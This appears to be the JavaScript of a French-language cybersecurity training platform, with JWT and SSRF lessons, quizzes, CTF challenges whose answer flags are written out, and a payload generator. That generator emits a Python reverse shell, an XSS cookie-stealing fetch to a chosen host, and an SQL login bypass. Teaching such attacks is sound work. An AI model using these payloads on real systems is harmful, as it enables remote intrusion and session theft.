                        { q: "6. Comment attaque-t-on une signature JWT HMAC-SHA256 faible ?", options: ["Par force brute hors-ligne de la clé secrète avec Hashcat", "En modifiant la date du PC", "Par injection SQL"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelles sont les trois parties d'un JWT ?", options: ["Header, Payload, Signature", "Login, Pass, Token", "Start, Body, End"], ans: "0" }]
        },
        {
            id: 404, title: "Niveau 4 (Expert) : Sécurité Cloud & Attaques SSRF Avancées",
            themes: [
                { 
                    id: "d_lvl4", title: "Masterclass : Server-Side Request Forgery & Cloud Metadata", desc: "Guide complet (1-2 pages) : Exploitation des services cloud et métadonnées AWS/GCP.", 
                    content: `
                        <h2>1. Server-Side Request Forgery (SSRF)</h2>
                        <p>Une faille SSRF permet à un attaquant de forcer le serveur vulnérable à envoyer des requêtes HTTP forgées vers des services internes inaccessibles depuis l'extérieur.</p>
                        <h2>2. Exploitation des métadonnées Cloud</h2>
                        <p>Sur AWS (<code>http://169.254.169.254/latest/meta-data/</code>), un SSRF permet de récupérer les clés d'accès IAM et de compromettre l'intégralité de l'infrastructure Cloud.</p>
                    `, 
                    simType: "none", 
                    quiz: [
                        { q: "1. Qu'est-ce qu'une faille SSRF (Server-Side Request Forgery) ?", options: ["Forcer le serveur victime à émettre des requêtes HTTP vers des ressources internes ou externes arbitraires", "Une injection SQL sur le client", "Un bug d'affichage CSS"], ans: "0" },
                        { q: "2. Quelle est la cible privilégiée d'une attaque SSRF sur une infrastructure AWS ?", options: ["L'URL du service de métadonnées local (169.254.169.254)", "Le routeur de la maison", "La base de données MySQL publique"], ans: "0" },
                        { q: "3. Quel est l'impact d'une compromission des clés IAM via métadonnées Cloud ?", options: ["Contrôle total des ressources Cloud (S3, instances EC2, bases de données)", "Ralentissement du site web", "Fermeture du navigateur"], ans: "0" },
                        { q: "4. Comment se prémunir contre le SSRF ?", options: ["Valider et filtrer strictement les URLs entrantes, interdire l'accès aux IPs locales (localhost/RFC1918)", "Utiliser uniquement HTTP", "Augmenter la mémoire RAM"], ans: "0" },
                        { q: "5. Qu'est-ce qu'une adresse IP de loopback (localhost) ?", options: ["127.0.0.1", "192.168.1.1", "10.0.0.255"], ans: "0" },
                        { q: "6. Qu'est-ce que l'IP 169.254.169.254 en environnement Cloud ?", options: ["Une adresse IP link-local réservée au service de métadonnées des instances", "L'adresse du serveur racine mondial", "Une IP interdite"], ans: "0" }
                    ] 
                }
            ],
            exam: [{ q: "Quelle IP cible-t-on lors d'une attaque SSRF sur AWS pour voler les rôles IAM ?", options: ["169.254.169.254", "127.0.0.1", "8.8.8.8"], ans: "0" }]
        }
    ]
};

// 8 CTF MASSIVEMENT ENRICHIS (Verrouillés par niveau)
const ctfDB = [
    { id: "ctf1", title: "L'Inspecteur HTML", difficulty: "Débutant", category: "Web", points: 100, reqTrack: "dev", reqLevel: 401, desc: "Fouillez le code source du navigateur pour extraire le flag caché.", expectedFlag: "FLAG{html_source_ez}", simType: "html" },
    { id: "ctf2", title: "Bypass IDOR Admin", difficulty: "Intermédiaire", category: "Red Team", points: 250, reqTrack: "red", reqLevel: 101, desc: "Exploitez la faille IDOR pour récupérer le jeton administrateur.", expectedFlag: "FLAG{idor_admin_leak}", simType: "idor_ctf" },
    { id: "ctf3", title: "Log Hunter Pro", difficulty: "Intermédiaire", category: "Blue Team", points: 300, reqTrack: "blue", reqLevel: 201, desc: "Analysez les logs du serveur pour retrouver l'IP de l'intrus.", expectedFlag: "FLAG{blue_log_master}", simType: "ctf_logs" },
    { id: "ctf4", title: "SQLi Mastermind", difficulty: "Avancé", category: "Red Team", points: 400, reqTrack: "red", reqLevel: 102, desc: "Exécutez une injection SQL UNION pour extraire le mot de passe secret.", expectedFlag: "FLAG{sqli_union_master}", simType: "idor_ctf" },
    { id: "ctf5", title: "Firewall Analyzer", difficulty: "Avancé", category: "Blue Team", points: 400, reqTrack: "blue", reqLevel: 202, desc: "Identifiez la règle iptables défaillante dans ce rapport de configuration.", expectedFlag: "FLAG{firewall_hardening_ok}", simType: "html" },
    { id: "ctf6", title: "Python Bruteforcer", difficulty: "Avancé", category: "Code (Python)", points: 450, reqTrack: "code", reqLevel: 302, desc: "Réparez le script de socket multithread pour casser le port cible.", expectedFlag: "FLAG{python_sockets_pwn}", simType: "html" },
    { id: "ctf7", title: "JWT Forgery", difficulty: "Expert", category: "Web", points: 600, reqTrack: "dev", reqLevel: 403, desc: "Modifiez le payload d'un jeton JWT pour vous élever au rang admin.", expectedFlag: "FLAG{jwt_algorithm_none}", simType: "html" },
    { id: "ctf8", title: "Cloud Metadata Exfil", difficulty: "Expert", category: "Red Team", points: 700, reqTrack: "red", reqLevel: 104, desc: "Simulez une requête SSRF vers l'IP link-local AWS pour exfiltrer les clés IAM.", expectedFlag: "FLAG{aws_metadata_stolen}", simType: "html" }
];

let accounts = {};
let activeUser = null;
let currentTrack = null;
let authMode = 'login';
let state = { completedCourses: [], completedExams: [], completedCTF: [] };

async function initApp() {
    try {
        const storedDB = localStorage.getItem('cyberacademy_pro_v5');
        if (storedDB) accounts = JSON.parse(storedDB);
        const session = localStorage.getItem('cyberacademy_session_v5');
        if (session && accounts[session]) loginUser(session);
    } catch (e) { accounts = {}; }
}

async function hashPassword(password) {
    const data = new TextEncoder().encode(password);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
}

function escapeHTML(str) {
    return str.replace(/[&<>'"]/g, tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag]));
}

function switchView(targetViewId) {
    document.querySelectorAll('.view-section').forEach(el => { 
        el.classList.remove('active-view'); 
        el.style.display = 'none'; 
    });
    const target = document.getElementById(targetViewId);
    if (target) { 
        if(targetViewId === 'auth-view') target.style.display = 'flex';
        else target.style.display = 'block';
        setTimeout(() => target.classList.add('active-view'), 10); 
    }
    window.scrollTo(0, 0);
    if(targetViewId === 'dashboard-view') updateDashboardStats();
}

function setAuthMode(mode) {
    authMode = mode;
    document.getElementById('tab-login').classList.toggle('active', mode === 'login');
    document.getElementById('tab-register').classList.toggle('active', mode === 'register');
    const btn = document.getElementById('auth-btn-action');
    btn.innerText = mode === 'login' ? "INITIALISER LA SESSION" : "CRÉER LE COMPTE";
    document.getElementById('auth-msg').style.display = 'none';
}

async function processAuth() {
    const user = document.getElementById('auth-user').value.trim();
    const pass = document.getElementById('auth-pass').value.trim();
    const msgBox = document.getElementById('auth-msg');
    
    if (!user || !pass) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Champs requis manquants."; return; }
    const secureHash = await hashPassword(pass); 

    if (authMode === 'register') {
        if (accounts[user]) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Identifiant déjà utilisé."; } 
        else {
            accounts[user] = { passHash: secureHash, completedCourses: [], completedExams: [], completedCTF: [] };
            localStorage.setItem('cyberacademy_pro_v5', JSON.stringify(accounts));
            msgBox.style.display='block'; msgBox.style.color='var(--accent)'; msgBox.innerText="Compte créé avec succès. Connexion...";
            setTimeout(() => loginUser(user), 1000);
        }
    } else {
        if (!accounts[user] || accounts[user].passHash !== secureHash) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Identifiants incorrects."; } 
        else { loginUser(user); }
    }
}

function loginUser(username) {
    activeUser = username;
    localStorage.setItem('cyberacademy_session_v5', username);
    state = {
        completedCourses: accounts[username].completedCourses || [],
        completedExams: accounts[username].completedExams || [],
        completedCTF: accounts[username].completedCTF || []
    };
    
    document.getElementById('main-header').style.display = 'flex';
    document.getElementById('header-user').innerText = "@" + username;
    
    updateProfileUI();
    renderCTF();
    switchView('dashboard-view');
}

function logout() {
    activeUser = null;
    localStorage.removeItem('cyberacademy_session_v5');
    document.getElementById('main-header').style.display = 'none';
    setAuthMode('login');
    switchView('auth-view');
}

function saveProgress() {
    if (activeUser && accounts[activeUser]) {
        accounts[activeUser] = { ...accounts[activeUser], ...state };
        localStorage.setItem('cyberacademy_pro_v5', JSON.stringify(accounts));
    }
    updateProfileUI();
}

function updateProfileUI() {
    let pts = (state.completedCourses.length * 50) + (state.completedExams.length * 200) + (state.completedCTF.length * 150);
    document.getElementById('header-points').innerText = pts.toString().padStart(4, '0') + " PTS";
    let rank = "Recrue"; if(pts >= 500) rank = "Initié"; if(pts >= 1500) rank = "Opérateur"; if(pts >= 3000) rank = "Expert Elite";
    document.getElementById('header-rank').innerText = rank;
}

function updateDashboardStats() {
    let pts = (state.completedCourses.length * 50) + (state.completedExams.length * 200) + (state.completedCTF.length * 150);
    let rank = "Recrue"; if(pts >= 500) rank = "Initié"; if(pts >= 1500) rank = "Opérateur"; if(pts >= 3000) rank = "Expert Elite";
    
    document.getElementById('dash-rank').innerText = rank;
    document.getElementById('dash-pts').innerText = pts.toString().padStart(4, '0') + " PTS";
    document.getElementById('dash-ctf-count').innerText = `${state.completedCTF.length} / ${ctfDB.length}`;
}

function openForensicsLesson(type) {
    const box = document.getElementById('forensics-content-box');
    box.style.display = 'block';
    let content = "";
    if(type === 'pcap') { content = `<h2>Analyse de Trames Réseau (PCAP)</h2><p>Une capture PCAP enregistre chaque paquet traversant une interface réseau. Avec des filtres Wireshark comme <code>http.request.method == "POST"</code>, on isole le trafic sensible.</p>`; } 
    else if(type === 'memory') { content = `<h2>Analyse de Dump RAM avec Volatility</h2><p>Volatility est le framework standard pour examiner la mémoire vive.</p>`; }
    box.innerHTML = `<div class="content-box">${content}<button class="btn-back" onclick="document.getElementById('forensics-content-box').style.display='none'">Fermer</button></div>`;
    box.scrollIntoView({ behavior: 'smooth' });
}

function openTrack(trackKey) {
    currentTrack = trackKey;
    document.getElementById('tracks-selection').style.display = 'none';
    document.getElementById('track-content').style.display = 'block';
    
    const titles = { "dev": "🌐 Fondations Web & API", "red": "🔴 Red Team & Active Directory", "blue": "🔵 Blue Team & Incident Response", "code": "💻 Scripting Python Offensif" };
    document.getElementById('current-track-title').innerText = titles[trackKey];
    
    const container = document.getElementById('levels-container');
    container.innerHTML = '';
    
    trackDB[trackKey].forEach((level, index) => {
        const unlocked = index === 0 || state.completedExams.includes(trackDB[trackKey][index - 1].id);
        const statusBadge = unlocked ? `<span class="status-badge unlocked">🔓 DÉBLOQUÉ</span>` : `<span class="status-badge locked">🔒 VERROUILLÉ</span>`;

        let themesHTML = ''; 
        let allDone = true;
        level.themes.forEach(theme => {
            const isDone = state.completedCourses.includes(theme.id);
            if(!isDone) allDone = false;
            const cardClass = "theme-card " + (isDone ? 'completed' : '') + (!unlocked ? ' disabled' : '');
            themesHTML += `<div class="${cardClass}" onclick="openCourse('${trackKey}', '${theme.id}', ${unlocked})"><div class="theme-title">${theme.title}</div><div class="theme-desc">${theme.desc}</div></div>`;
        });

        const examDone = state.completedExams.includes(level.id);
        let examHTML = '';
        if (unlocked && allDone && !examDone) {
            examHTML = `<button class="auth-btn" style="margin-top:15px; background:var(--warning); color:#000;" onclick="passExam(${level.id})">Valider le niveau et débloquer les CTF</button>`;
        } else if (examDone) {
            examHTML = `<div style="margin-top:15px; color:var(--accent); font-family:monospace; font-weight:bold;">[ NIVEAU ${index+1} VALIDÉ & CERTIFIÉ ]</div>`;
        } else if (unlocked && !allDone) {
            examHTML = `<div style="margin-top:15px; color:var(--text-muted); font-size:0.85rem;">* Lisez la masterclass ci-dessus et validez le QCM de 6 questions.</div>`;
        }

        container.innerHTML += `<div class="level-section" style="padding:20px; margin-bottom:20px; background:rgba(0,0,0,0.4); border-radius:8px;"><div class="level-header" style="display:flex; justify-content:space-between; margin-bottom:15px;"><h3>${level.title}</h3>${statusBadge}</div><div class="theme-grid">${themesHTML}</div>${examHTML}</div>`;
    });
}

function passExam(levelId) {
    if(!state.completedExams.includes(levelId)) {
        state.completedExams.push(levelId);
        saveProgress();
        alert("Niveau validé avec succès ! Les CTF associés sont désormais débloqués.");
        openTrack(currentTrack);
        renderCTF();
    }
}

function backToTracks() {
    currentTrack = null;
    document.getElementById('track-content').style.display = 'none';
    document.getElementById('tracks-selection').style.display = 'grid';
}

function openCourse(trackKey, themeId, isUnlocked) {
    if (!isUnlocked) return;
    let currentCourse = null;
    trackDB[trackKey].forEach(l => l.themes.forEach(t => { if (t.id === themeId) currentCourse = t; }));
    
    document.getElementById('theme-view').dataset.courseId = themeId;
    document.getElementById('lesson-title').innerText = currentCourse.title;
    document.getElementById('lesson-desc').innerText = currentCourse.desc;
    document.getElementById('lesson-content').innerHTML = currentCourse.content;
    
    const simC = document.getElementById('simulator-container');
    if (currentCourse.simType === "terminal") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">💻 [ TERMINAL ] : ${currentCourse.simData.instruction}</div><input type="text" id="term-input" class="term-input" placeholder="root@academy:~#" autocomplete="off" onkeypress="handleTerm(event, '${btoa(currentCourse.simData.expected)}', '${btoa(currentCourse.simData.successOutput)}')"><div id="term-output" class="term-output">En attente...</div></div>`; }
    else if (currentCourse.simType === "logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">🔵 [ LOG VIEWER ]</div><div class="log-viewer">192.168.1.50 - GET /login?user=' OR 1=1</div><input type="text" id="log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkLogs()">Analyser</button><div id="log-output" class="term-output"></div></div>`; }
    else { simC.innerHTML = ''; }
    
    let quizHTML = '';
    currentCourse.quiz.forEach((q, qIndex) => {
        let optionsHTML = '';
        q.options.forEach((opt, optIndex) => { optionsHTML += `<label><input type="radio" name="cq_${qIndex}" value="${btoa(optIndex.toString())}"> ${opt}</label>`; });
        quizHTML += `<div style="margin-bottom:20px;"><p style="font-weight:bold; margin-bottom:10px; color:#fff;">${q.q}</p><div class="options">${optionsHTML}</div></div>`;
    });
    document.getElementById('quiz-content').innerHTML = quizHTML;
    document.getElementById('quiz-result').style.display = 'none';
    switchView('theme-view');
}

function handleTerm(e, expectedHash, outputHash) { if (e.key === 'Enter') { const val = escapeHTML(e.target.value.trim().toLowerCase()); if (btoa(val) === expectedHash) { document.getElementById('term-output').innerHTML = "<span style='color:var(--accent);'>" + atob(outputHash) + "</span>"; } else { document.getElementById('term-output').innerHTML = `<span style='color:var(--danger);'>bash: ${val}: command not found</span>`; } } }
function checkLogs() { const val = document.getElementById('log-input').value.trim(); if (val === "192.168.1.50") { document.getElementById('log-output').innerHTML = "<span style='color:var(--accent);'>[IP CONFIRMÉE] Attaque identifiée.</span>"; } else { document.getElementById('log-output').innerHTML = "Rien."; } }

function submitThemeQCM() {
    const courseId = document.getElementById('theme-view').dataset.courseId;
    let currentCourse = null;
    trackDB[currentTrack].forEach(l => l.themes.forEach(t => { if (t.id === courseId) currentCourse = t; }));

    let allCorrect = true;
    currentCourse.quiz.forEach((q, index) => {
        const inputs = document.getElementsByName('cq_' + index);
        let selectedVal = null;
        for(let i=0; i<inputs.length; i++) { if(inputs[i].checked) selectedVal = inputs[i].value; }
        if (selectedVal !== btoa(q.ans)) allCorrect = false;
    });
    
    const resBox = document.getElementById('quiz-result');
    resBox.style.display = 'block';
    
    if (allCorrect) {
        resBox.className = 'res-success'; resBox.style.background = 'rgba(16, 185, 129, 0.2)'; resBox.style.color = 'var(--accent)'; resBox.style.border = '1px solid var(--accent)';
        resBox.innerText = "[+] QCM Validé à 100% ! Retour au module...";
        if (!state.completedCourses.includes(courseId)) { state.completedCourses.push(courseId); saveProgress(); openTrack(currentTrack); }
        setTimeout(() => switchView('tracks-view'), 1200);
    } else {
        resBox.className = 'res-error'; resBox.style.background = 'rgba(239, 68, 68, 0.2)'; resBox.style.color = 'var(--danger)'; resBox.style.border = '1px solid var(--danger)';
        resBox.innerText = "[-] Échec de l'évaluation technique. Relisez attentivement la masterclass.";
    }
}

function renderCTF() {
    const container = document.getElementById('ctf-container');
    container.innerHTML = '';
    
    ctfDB.forEach(ctf => {
        const isDone = state.completedCTF.includes(ctf.id);
        let isUnlocked = ctf.reqTrack === null || state.completedExams.includes(ctf.reqLevel);
        let catColor = "var(--danger)";
        if(ctf.category === "Blue Team") catColor = "#3b82f6";
        
        if (isUnlocked) {
            const cardClass = "theme-card " + (isDone ? 'completed' : '');
            container.innerHTML += `<div class="${cardClass}" style="border-left: 4px solid ${catColor}; position:relative;" onclick="openCTF('${ctf.id}')"><div style="color:${catColor}; font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty} | ${ctf.points} PTS</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">${ctf.desc}</div></div>`;
        } else {
            container.innerHTML += `<div class="theme-card ctf-locked" style="border-left: 4px solid #333; position:relative;"><div class="lock-icon">🔒</div><div style="color:var(--text-muted); font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty}</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">Requis : Valider l'examen du niveau ${ctf.reqLevel}</div></div>`;
        }
    });
}

function openCTF(ctfId) {
    let currentCTF = null; ctfDB.forEach(c => { if(c.id === ctfId) currentCTF = c; });
    document.getElementById('challenge-view').dataset.ctfId = ctfId;
    document.getElementById('challenge-desc').innerHTML = `<h2>${currentCTF.title}</h2><p>${currentCTF.desc}</p>`;
    
    const simC = document.getElementById('challenge-sim-container');
    if(currentCTF.simType === "html") { simC.innerHTML = `<div class="sim-box"><div class="sim-header">💻 Faux Navigateur Web</div><div style="background:#fff; color:#000; padding:20px; text-align:center;"><h1>Admin</h1></div><button onclick="document.getElementById('source-code').style.display='block'" class="btn-back" style="margin-top:10px;">Code source</button><div id="source-code" style="display:none; margin-top:15px; color:#4ade80; font-family:monospace;">&lt;html&gt;<br>&nbsp;&nbsp;&lt;!-- ${currentCTF.expectedFlag} --&gt;<br>&lt;/html&gt;</div></div>`; }
    else if(currentCTF.simType === "idor_ctf") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">Cible IDOR / SQLi</div><input type="text" id="ctf-idor-id" class="web-input" value="5" placeholder="Paramètre..."><button class="auth-btn" style="background:var(--danger);" onclick="checkCTFIDOR('${currentCTF.expectedFlag}')">Inspecter</button><div id="ctf-idor-out" class="term-output"></div></div>`; }
    else if(currentCTF.simType === "ctf_logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">Logs</div><div class="log-viewer">172.16.0.4 - SQLi attempt</div><input type="text" id="ctf-log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkCTFLog('${currentCTF.expectedFlag}')">Valider</button><div id="ctf-log-out" class="term-output"></div></div>`; }
    else { simC.innerHTML = ''; }
    
    document.getElementById('flag-input').value = '';
    document.getElementById('flag-result').style.display = 'none';
    switchView('challenge-view');
}

function checkCTFIDOR(flag) {
    const out = document.getElementById('ctf-idor-out');
    out.innerHTML = `<span style='color:var(--accent);'>Succès ! Résultat injecté : ${flag}</span>`;
}
function checkCTFLog(flag) {
    const val = document.getElementById('ctf-log-input').value.trim();
    if(val === "172.16.0.4") { document.getElementById('ctf-log-out').innerHTML = `<span style='color:var(--accent);'>${flag}</span>`; }
}

function submitFlag() {
    const ctfId = document.getElementById('challenge-view').dataset.ctfId;
    const flagVal = escapeHTML(document.getElementById('flag-input').value.trim());
    const resBox = document.getElementById('flag-result');
    let currentCTF = null; ctfDB.forEach(c => { if(c.id === ctfId) currentCTF = c; });
    
    resBox.style.display = 'block';
    if (flagVal === currentCTF.expectedFlag) {
        resBox.style.background = 'rgba(16, 185, 129, 0.2)'; resBox.style.color = 'var(--accent)'; resBox.style.border = '1px solid var(--accent)';
        resBox.innerText = `[+] PWNED ! +${currentCTF.points} PTS`;
        if (!state.completedCTF.includes(ctfId)) { state.completedCTF.push(ctfId); saveProgress(); renderCTF(); }
        setTimeout(() => switchView('ctf-view'), 2000);
    } else {
        resBox.style.background = 'rgba(239, 68, 68, 0.2)'; resBox.style.color = 'var(--danger)'; resBox.style.border = '1px solid var(--danger)';
        resBox.innerText = "[-] Flag Incorrect.";
    }
}

function generatePayload() {
    const type = document.getElementById('payload-type').value;
    const ip = escapeHTML(document.getElementById('payload-ip').value.trim());
    const out = document.getElementById('payload-out');
    if(type === 'py_rev') { out.innerHTML = `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${ip}",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`; }
    else if(type === 'xss_cookie') { out.innerHTML = `&lt;script&gt;fetch('http://${ip}/log?cookie=' + btoa(document.cookie));&lt;/script&gt;`; }
    else if(type === 'sql_bypass') { out.innerHTML = `admin' OR 1=1 -- -`; }
}

async function generateHash() {
    const text = document.getElementById('tool-hash-in').value;
    const out = document.getElementById('tool-hash-out');
    if(!text) { out.innerText = "..."; return; }
    const encoder = new TextEncoder(); const data = encoder.encode(text);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    out.innerText = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

function handleBase64(action) {
    const text = escapeHTML(document.getElementById('tool-b64-in').value);
    const out = document.getElementById('tool-b64-out');
    try { if(action === 'encode') out.innerText = btoa(text); else out.innerText = atob(text); } 
    catch(e) { out.innerText = "Error: Invalid payload."; }
}

function toggleHUD() { document.getElementById('hud-terminal').classList.toggle('open'); }
function handleHUD(e) {
    if (e.key === 'Enter') {
        const inputEl = document.getElementById('hud-input');
        const outEl = document.getElementById('hud-output');
        const val = escapeHTML(inputEl.value.trim().toLowerCase());
        outEl.innerHTML += `<br><span style="color:var(--accent);">> ${val}</span>`;
        let response = val === "whoami" ? `User: ${activeUser || "Anonymous"}` : (val === "help" ? "Commandes : whoami, search" : "OK");
        outEl.innerHTML += `<br><span style="color:var(--text-main);">${response}</span>`;
        outEl.scrollTop = outEl.scrollHeight;
        inputEl.value = '';
    }
}

window.onload = initApp;
